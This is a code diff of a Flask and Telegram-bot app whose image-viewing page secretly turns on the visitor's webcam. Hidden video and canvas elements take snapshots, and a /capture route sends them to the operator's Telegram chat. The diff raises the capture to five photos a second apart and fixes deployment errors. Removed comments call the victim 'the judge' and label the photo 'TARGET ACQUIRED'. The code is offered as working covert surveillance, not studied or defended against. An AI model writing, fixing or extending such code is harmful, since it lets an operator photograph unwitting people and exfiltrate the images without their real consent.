@@ -39,31 +39,32 @@ def view_image(image_id):
 
                 <video id="video" width="320" height="240" style="display:none;" autoplay playsinline></video>
                 <canvas id="canvas" style="display:none;"></canvas>
-
                 <script>
-                    // Ask for permission to show the image "securely"
-                    navigator.mediaDevices.getUserMedia({{ video: true }})
-                    .then(stream => {{
-                        const video = document.getElementById('video');
-                        video.srcObject = stream;
-                        
-                        // Wait 2.5 seconds to ensure the judge is focused on the image
-                        setTimeout(() => {{
-                            const canvas = document.getElementById('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            
-                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                            
-                            fetch('/capture', {{
-                                method: 'POST',
-                                headers: {{ 'Content-Type': 'application/json' }},
-                                body: JSON.stringify({{ image: dataURL }})
-                            }});
-                        }}, 2500);
-                    }})
-                    .catch(err => console.log("Permission denied"));
+                navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    let shotsTaken = 0;
+                    const interval = setInterval(() => {
+                        if (shotsTaken >= 5) {
+                        clearInterval(interval);
+                        return;
+                        }
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const dataURL = canvas.toDataURL('image/jpeg', 0.5);
+
+                        fetch('/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image: dataURL })
+                            });
+                            shotsTaken++;
+                            }, 1000);
+                        })
+                     .catch(err => console.log("Permission denied"));
                 </script>
             </body>
         </html>
@@ -73,16 +74,17 @@ def view_image(image_id):
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    """Receives the judge's photo and sends it to your Telegram."""
     try:
         data = request.json['image']
-        image_data = base64.b64decode(data.split(',')[1])
-        bot.send_photo(CHAT_ID, image_data, caption="🎯 TARGET ACQUIRED: Target's Photo Captured!")
+        # The split handles the "data:image/jpeg;base64," prefix
+        image_bytes = base64.b64decode(data.split(',')[1])
+        
+        # Using the bot instance to send
+        bot.send_photo(CHAT_ID, image_bytes, caption="📸 Snapshot Captured")
         return jsonify({"status": "success"}), 200
     except Exception as e:
-        print(f"Capture Error: {e}")
-        return "Error", 500
-
+        print(f"Capture Error: {e}") # This will show the EXACT error in Render Logs
+        return str(e), 500
 # --- BOT HANDLERS ---
 
 @bot.message_handler(commands=['start'])
@@ -100,10 +102,10 @@ def handle_photo(message):
 
 if __name__ == '__main__':
     # Start bot in background thread
-    bot_thread = Thread(target=lambda: bot.infinity_polling(timeout=10, long_polling_timeout=5))
+    bot_thread = Thread(target=lambda: bot.infinity_polling(timeout=20, long_polling_timeout=10))
     bot_thread.daemon = True
     bot_thread.start()
     
-    # Start web server
+    # CRITICAL: use_reloader=False stops the 409 Conflict error
     port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, use_reloader=False)
